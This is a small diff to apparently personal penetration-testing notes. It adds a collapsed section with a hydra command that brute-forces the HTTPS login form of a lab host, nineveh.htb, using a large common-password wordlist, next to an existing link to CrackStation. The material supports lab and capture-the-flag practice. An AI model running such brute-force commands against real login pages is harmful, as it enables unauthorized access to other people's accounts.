@@ -1,4 +1,14 @@
 <details>
+  <summary><strong>hydra</strong></summary>
+
+```bash
+hydra nineveh.htb -l 0xdf -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
+```
+ 
+</details>
+
+---
+<details>
   <summary><strong>Crack Station</strong></summary>
 
 - https://crackstation.net/
